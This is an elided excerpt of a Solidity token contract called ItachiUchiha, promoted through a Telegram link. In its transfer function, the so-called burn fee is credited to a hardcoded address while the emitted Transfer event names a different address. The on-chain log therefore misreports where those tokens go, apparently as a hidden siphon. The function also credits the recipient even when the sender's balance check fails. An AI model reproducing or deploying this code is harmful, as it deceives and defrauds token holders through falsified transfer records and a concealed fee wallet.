...
// Submitted for Telegram: https://t.me/Itachiuchihabsc
...
contract  ItachiUchiha  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xe35285E4ca858409434B86Cd425338B5b8B5d7C7] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xBf5140A22578168FD562DCcF235E5D43A02ce9B1, _bruntoken);
        }
